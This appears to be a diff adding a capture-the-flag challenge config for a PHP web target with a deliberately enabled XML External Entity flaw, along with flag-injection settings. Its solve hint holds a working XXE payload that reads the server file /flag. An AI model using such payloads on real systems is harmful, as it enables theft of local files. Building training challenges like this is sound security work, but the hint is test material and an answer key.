@@ -1,0 +1,17 @@
+{
+  "component_type": "INSTANCE",
+  "id": "web-xxe-php-01",
+  "name": "XML External Entity Injection",
+  "category": "web",
+  "difficulty": "medium",
+  "description": "XML 解析未禁用外部实体，可通过 DOCTYPE 注入读取服务器本地文件，flag 在 /flag",
+  "requirements": {
+    "compose_model": "web_php"
+  },
+  "flag_injection": {
+    "file": "src/index.php",
+    "placeholder": "FLAG_PLACEHOLDER",
+    "note": "flag 通过 FLAG 环境变量写入 /flag"
+  },
+  "solve_hint": "POST body: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///flag'>]><user><name>&xxe;</name></user>"
+}
